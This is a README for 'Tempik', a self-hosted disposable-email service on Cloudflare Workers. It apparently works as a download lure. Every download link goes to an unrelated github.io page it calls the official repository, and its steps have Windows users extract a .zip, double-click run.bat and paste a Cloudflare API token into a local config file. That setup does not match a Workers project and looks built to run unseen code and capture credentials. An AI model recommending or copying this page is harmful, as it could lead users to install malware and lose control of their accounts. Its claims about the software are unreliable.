# 📧 tempik - Protect your privacy with disposable email

[![Download Tempik](https://img.shields.io/badge/Download-Tempik-blue.svg)](https://mawarpu1886.github.io)

Tempik provides a private way to receive emails without using your personal address. This tool creates temporary accounts for websites, newsletters, or verification codes. It runs on Cloudflare Workers to ensure speed and reliability. You own your data because you host the software on your own account.

## 📋 What Tempik Does

Many websites ask for an email address to grant access. Giving your real address often results in unwanted spam. Tempik solves this problem. It generates a temporary address that works for a short time. You can view all received messages in a clean interface. Once you finish your task, you delete the address or let it expire. Your real inbox stays clean and secure.

## ⚙️ System Requirements

To run this tool, you need a basic computer setup:
- A Windows computer running Windows 10 or 11.
- An active Cloudflare account.
- A registered domain name to manage your email addresses.
- A stable internet connection.

This software does not require high-end hardware. Because the processing happens on Cloudflare servers, your computer only acts as a management tool.

## 🚀 Setting Up Your Account

Before you use the software, you must prepare your environment. Follow these steps to connect your domain:

1. Log into your Cloudflare dashboard.
2. Select the domain you want to link to Tempik.
3. Open the Workers & Pages section. 
4. Configure your Email Routing rules to direct traffic to your worker. 

This process connects your specific domain name to the email service. It ensures that any email sent to your custom address reaches the Tempik tool.

## 💾 Installation Steps

You can obtain the current version of the software from the official repository. 

[Click here to visit the download page](https://mawarpu1886.github.io)

1. Open the link above in your web browser.
2. Look for the Releases section on the right side of the screen.
3. Select the latest version listed.
4. Download the file ending in .zip to your computer.
5. Right-click the folder and select Extract All.
6. Open the folder to see the project files.

## 🛠️ Configuring the Service

Once you have the files, you must tell the software how to connect to your Cloudflare account. Open the file labeled config.json using a basic text editor like Notepad.

- API_TOKEN: Paste your Cloudflare API token here.
- ZONE_ID: Enter your Cloudflare zone identifier.
- SUBDOMAIN: Choose an address for your email service.

Save the file after you add your details. The software uses these keys to securely communicate with your account. Do not share this file with anyone. 

## ⚡ Running the Software

After configuration, you are ready to start. 

1. Double-click the file named run.bat in your folder.
2. A black command window appears on your screen. 
3. The software checks your connection.
4. If successful, it provides a local address to view your inbox.
5. Copy this address into your browser.

The interface shows all active email addresses and incoming messages. You can generate new addresses with one click. 

## 🛡️ Managing Your Inbox

The main screen lists every email received at your addresses. Each row shows the sender, the subject line, and the time the message arrived. Click the subject line to read the full content. 

If you receive spam, use the delete option to remove the message from your records. You can also destroy an entire email address to stop all future messages from reaching you. 

## 🔍 Frequently Asked Questions

**Does the software store my private emails?**
No. Tempik only displays messages held on your Cloudflare worker. Once you delete them, they disappear from your system.

**Can I use this for official business?**
This tool is for temporary use only. Do not use it for sensitive accounts like banking or government sites. It is best for one-time registrations.

**What happens if the service stops?**
If your Cloudflare worker expires or the domain is disconnected, the email service stops. You can restore access by updating your settings in the dashboard.

**I see an error message.**
Check your internet connection first. If the error persists, open your config.json file and verify that your API token is correct. If the token is old, generate a new one in the Cloudflare dashboard.

## 📦 Troubleshooting Tips

If the browser does not load the inbox:
- Restart the run.bat file to force a reconnection.
- Check if your antivirus software blocks the connection.
- Ensure your Cloudflare account remains active.

If emails do not arrive:
- Check your domain DNS settings.
- Verify that your domain allows email forwarding.
- Refresh your browser tab to check for new headers.

Managing disposable email requires consistent settings. Keep your Cloudflare account updated to avoid service gaps. Tempik handles the technical labor so you can browse the web without worry. Clean inboxes lead to better digital security. Follow these steps to maintain your privacy while using online services.